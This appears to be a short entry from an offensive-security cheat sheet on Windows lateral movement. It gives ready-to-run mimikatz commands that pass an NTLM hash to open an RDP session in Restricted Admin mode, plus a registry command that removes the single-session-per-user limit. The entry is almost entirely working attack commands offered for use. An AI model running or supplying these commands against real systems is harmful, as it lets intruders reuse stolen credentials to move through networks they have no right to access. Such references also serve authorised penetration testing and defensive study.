---
title: RDP Pass-the-Hash (Restricted Admin)
category: tunnels
subcategory: lateral-movement
os: windows
command: sekurlsa::pth /run:"mstsc.exe /restrictedadmin"
tools: mimikatz, mstsc
---


Requires `Restricted Admin Mode` to be enabled on the RDP target.

### Spawn mstsc in Restricted Admin mode with pth

```
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:admin /domain:intranet.local /ntlm:a7f3e2b14d9058c6e8b720f5d1c93ea4 /run:"mstsc.exe /restrictedadmin"
```

Type the destination hostname in the resulting RDP window.

### Bypass the single-RDP-session-per-user limit

```cmd
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUser /t REG_DWORD /d 0
```
